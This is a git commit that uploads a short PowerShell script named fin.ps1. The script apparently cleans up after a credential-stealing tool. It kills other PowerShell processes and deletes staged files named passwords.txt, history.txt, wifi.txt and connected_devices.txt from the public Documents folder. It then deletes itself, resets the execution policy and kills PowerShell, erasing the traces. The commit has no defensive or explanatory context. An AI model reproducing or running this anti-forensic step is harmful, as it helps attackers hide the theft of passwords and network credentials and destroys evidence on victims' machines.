39a807f95374d18fd714027989ff6b57d14a4965
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-11 03:02:15 +0100

    Add files via upload

---
+++ other_files/fin.ps1
@@ -0,0 +1,9 @@
+Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
+cd C:\Users\Public\Documents
+del passwords.txt
+del history.txt
+del wifi.txt
+del connected_devices.txt
+del fin.ps1
+Set-ExecutionPolicy restricted -Force
+taskkill -F /IM powershell.exe
